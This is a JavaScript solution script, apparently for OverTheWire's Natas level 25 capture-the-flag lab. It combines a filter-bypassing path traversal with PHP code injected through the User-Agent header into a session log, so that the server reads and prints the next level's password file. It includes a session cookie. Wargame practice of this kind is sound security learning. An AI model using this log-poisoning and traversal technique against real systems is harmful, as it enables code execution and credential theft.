// This code works only from Firefox 43+ since setting User-Agent is allowed from then on. Chrome returns error
// VM93:3 Refused to set unsafe header "User-Agent"
// https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name
url = 'http://natas25.natas.labs.overthewire.org/index.php';
injection = '?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_';
cookie = 'bp6li93hq7e5v3r4uvrq8dqjd0'; // Since cookie is HttpOnly, read it and replace string here
log_append = '.log';

truestring = "natas26 password:";

xhr = new XMLHttpRequest();
xhr.open('GET',url+injection+cookie+log_append,false);
xhr.setRequestHeader('User-Agent', 'natas26 password: <?php include "/etc/natas_webpass/natas26" ?>');
xhr.onload = function () {
	if (xhr.responseText.includes(truestring)) {
		console.log(xhr.responseText);
	}
};
xhr.send();